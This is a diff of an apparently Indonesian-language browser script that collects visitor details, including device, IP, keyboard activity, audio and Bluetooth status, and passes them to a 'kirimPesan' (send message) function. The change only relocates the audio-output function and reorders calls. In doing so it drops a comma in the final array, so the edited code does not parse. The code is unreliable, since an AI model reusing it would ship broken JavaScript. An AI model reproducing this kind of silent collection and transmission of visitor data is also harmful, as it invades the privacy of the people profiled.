@@ -535,34 +535,6 @@ Gamepad Terhubung     : ${gamepad}
 `.trim();
 };
 
-const ambilOutputAudio = async () => {
-  let sinkSupport = 'Tidak didukung';
-  let bluetoothStatus = 'Tidak terdeteksi';
-
-  try {
-    const audio = document.createElement("audio");
-    sinkSupport = typeof audio.setSinkId === "function" ? "Didukung" : "Tidak didukung";
-  } catch {}
-
-  try {
-    if (navigator.bluetooth) {
-      // Cek apakah permission sudah pernah diminta sebelumnya
-      const status = await navigator.permissions.query({ name: "bluetooth" }).catch(() => {});
-      bluetoothStatus = status?.state === "granted" ? "Terhubung" : "Tidak terhubung";
-    } else {
-      bluetoothStatus = "Tidak didukung";
-    }
-  } catch {
-    bluetoothStatus = "Tidak terdeteksi";
-  }
-
-  return `
-౼ 〘 𝗢𝗨𝗧𝗣𝗨𝗧 𝗔𝗨𝗗𝗜𝗢 〙 ౼
-Audio Output Sink      : ${sinkSupport}
-Bluetooth              : ${bluetoothStatus}
-`.trim();
-};
-
 const ambilSistemKemampuan = () => {
   const hasTouch = navigator.maxTouchPoints > 0 ? "Ya" : "Tidak";
   const touchPoints = navigator.maxTouchPoints || 0;
@@ -596,6 +568,34 @@ Resolusi Layar         : ${screenWidth} x ${screenHeight}
 Rasio DPI              : ${devicePixelRatio}
 Refresh Rate (estimasi): ${refreshRate}
 Mode Orientasi         : ${orientation.includes("portrait") ? "Portrait" : "Landscape"}
+`.trim();
+};
+
+const ambilOutputAudio = async () => {
+  let sinkSupport = 'Tidak didukung';
+  let bluetoothStatus = 'Tidak terdeteksi';
+
+  try {
+    const audio = document.createElement("audio");
+    sinkSupport = typeof audio.setSinkId === "function" ? "Didukung" : "Tidak didukung";
+  } catch {}
+
+  try {
+    if (navigator.bluetooth) {
+      // Cek apakah permission sudah pernah diminta sebelumnya
+      const status = await navigator.permissions.query({ name: "bluetooth" }).catch(() => {});
+      bluetoothStatus = status?.state === "granted" ? "Terhubung" : "Tidak terhubung";
+    } else {
+      bluetoothStatus = "Tidak didukung";
+    }
+  } catch {
+    bluetoothStatus = "Tidak terdeteksi";
+  }
+
+  return `
+౼ 〘 𝗢𝗨𝗧𝗣𝗨𝗧 𝗔𝗨𝗗𝗜𝗢 〙 ౼
+Audio Output Sink      : ${sinkSupport}
+Bluetooth              : ${bluetoothStatus}
 `.trim();
 };
 
@@ -679,8 +679,8 @@ const mulai = async () => {
   // Fitur tambahan
   const keyboard = ambilKeyboardActivity();
   const perangkatEksternal = ambilPerangkatEksternal();
-  const outputAudio = await ambilOutputAudio();
   const sistemKemampuan = ambilSistemKemampuan(); // ✅ Tambahan baru
+  const outputAudio = await ambilOutputAudio();
 
   const gabungAwal = [
     infoPerangkat,
@@ -692,8 +692,8 @@ const mulai = async () => {
     ipInfo,
     keyboard,
     perangkatEksternal,
-    outputAudio,
     sistemKemampuan // ✅ Ditambahkan ke gabungan
+    outputAudio,
   ].join("\n\n");
 
   await kirimPesan(gabungAwal);
